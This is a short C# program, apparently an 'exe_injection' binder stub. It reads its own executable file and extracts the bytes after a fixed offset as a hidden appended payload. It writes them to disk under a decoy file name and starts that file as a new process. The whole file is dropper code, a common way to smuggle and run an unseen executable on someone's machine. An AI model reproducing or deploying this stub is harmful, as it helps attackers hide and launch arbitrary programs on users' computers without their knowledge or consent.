using System;
using System.IO;
using System.Collections;
using System.Linq;

namespace exe_injection
{
    class Program
    {

        private const int INJECTION_LEN = 53293191;

        static void Main(string[] args)
        {
            string name = System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe";

            // Get the payload executable
            byte[] allBytes = File.ReadAllBytes(name);

            int payloadSize = allBytes.Length - INJECTION_LEN;

            byte[] payloadBytes = allBytes.ToList().GetRange(INJECTION_LEN, payloadSize).ToArray();

            File.WriteAllBytes("this_file_dont_exist.exe", payloadBytes);

            System.Diagnostics.Process.Start("this_file_dont_exist.exe");

            Console.ReadLine();
        }
    }
}
